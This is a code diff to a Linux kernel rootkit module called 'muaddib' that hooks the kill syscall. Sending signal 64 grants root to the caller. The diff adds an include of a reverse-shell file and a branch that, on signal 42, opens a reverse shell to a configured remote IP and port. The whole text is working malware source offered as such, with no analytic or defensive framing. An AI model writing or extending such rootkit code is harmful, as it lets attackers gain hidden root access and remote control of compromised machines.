@@ -1,3 +1,5 @@
+#include "revshell.c"
+
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*og_kill)(const struct pt_regs *);
 
@@ -13,9 +15,14 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
 
     if ( sig == 64 )
     {
-        printk(KERN_INFO "rootkit: giving root...\n");
+        printk(KERN_INFO "muaddib: giving root\n");
         set_root();
         return 0;
+    }
+
+    else if (sig == 42){
+        printk(KERN_INFO "muaddib: starting reverse shell\n");
+        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
     }
 
     return og_kill(regs);
